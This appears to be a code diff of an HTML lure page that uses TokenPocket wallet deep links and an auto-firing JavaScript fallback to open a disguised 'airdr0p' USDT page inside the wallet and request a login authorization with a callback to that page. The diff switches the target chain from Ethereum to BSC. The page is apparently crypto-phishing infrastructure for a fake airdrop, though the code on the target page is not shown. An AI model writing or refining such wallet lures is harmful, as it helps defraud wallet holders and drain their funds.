@@ -3,29 +3,29 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>唤醒 TP 打开第三方页面</title>
+  <title>唤醒 TP 打开 BSC 页面</title>
 </head>
 <body>
 
-<h2>点击按钮唤醒 TP 钱包并打开页面</h2>
+<h2>点击按钮唤醒 TP 钱包（BSC 链）并打开页面</h2>
 
-<!-- 主按钮：tpdapp 打开网页 -->
-<a href='tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%2C%22chain%22%3A%22ETH%22%2C%22source%22%3A%22web%22%7D' 
+<!-- 主按钮：tpdapp 打开网页（BSC） -->
+<a href='tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%2C%22chain%22%3A%22BSC%22%2C%22source%22%3A%22web%22%7D' 
    style="display: inline-block; padding:15px 30px; font-size:18px; background:#00A3FF; color:white; border:none; border-radius:8px; text-decoration:none; margin:10px;">
-  方案1: 直接在 TP 浏览器打开页面
+  方案1: 直接在 TP BSC 浏览器打开页面
 </a>
 
 <br/>
 
-<!-- 备用按钮：tpoutside 授权 + 回调 -->
-<a href='tpoutside://pull.activity?param=%7B%22action%22%3A%22login%22%2C%22actionId%22%3A%22unique-id-2025%22%2C%22blockchains%22%3A%5B%7B%22chainId%22%3A%221%22%2C%22network%22%3A%22ethereum%22%7D%5D%2C%22dappName%22%3A%22MyDApp%22%2C%22protocol%22%3A%22TokenPocket%22%2C%22version%22%3A%222.0%22%2C%22callbackUrl%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%7D' 
+<!-- 备用按钮：tpoutside 授权 + BSC 回调 -->
+<a href='tpoutside://pull.activity?param=%7B%22action%22%3A%22login%22%2C%22actionId%22%3A%22unique-id-2025%22%2C%22blockchains%22%3A%5B%7B%22chainId%22%3A%2256%22%2C%22network%22%3A%22bsc%22%7D%5D%2C%22dappName%22%3A%22MyDApp%22%2C%22protocol%22%3A%22TokenPocket%22%2C%22version%22%3A%222.0%22%2C%22callbackUrl%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%7D' 
    style="display: inline-block; padding:15px 30px; font-size:18px; background:#28a745; color:white; border:none; border-radius:8px; text-decoration:none; margin:10px;">
-  方案2: 授权后回调打开页面
+  方案2: BSC 授权后回调打开页面
 </a>
 
 <!-- JS 增强版按钮（自动 fallback） -->
 <button onclick="openTPWithFallback()" style="padding:15px 30px; font-size:18px; background:#6f42c1; color:white; border:none; border-radius:8px; cursor:pointer; margin:10px;">
-  方案3: 智能唤醒 + 打开页面
+  方案3: 智能唤醒 TP（BSC）+ 打开页面
 </button>
 
 <div id="qrcode" style="margin-top:20px; display:none; text-align:center;">
@@ -55,18 +55,18 @@ function openTPWithFallback() {
     return;
   }
 
-  // 方案1: tpdapp 打开网页
-  const params1 = { url: TARGET_URL, chain: "ETH", source: "web" };
+  // 方案1: tpdapp 打开网页（BSC）
+  const params1 = { url: TARGET_URL, chain: "BSC", source: "web" };
   const encodedParams1 = encodeURIComponent(JSON.stringify(params1));
   const scheme1 = `tpdapp://open?params=${encodedParams1}`;
   window.location.href = scheme1;
 
-  // 方案2: 300ms 后 tpoutside 授权 + 回调
+  // 方案2: 300ms 后 tpoutside 授权 + BSC 回调
   setTimeout(() => {
     const params2 = {
       action: "login",
       actionId: Date.now().toString(),
-      blockchains: [{ chainId: "1", network: "ethereum" }],
+      blockchains: [{ chainId: "56", network: "bsc" }],
       dappName: "MyDApp",
       protocol: "TokenPocket",
       version: "2.0",
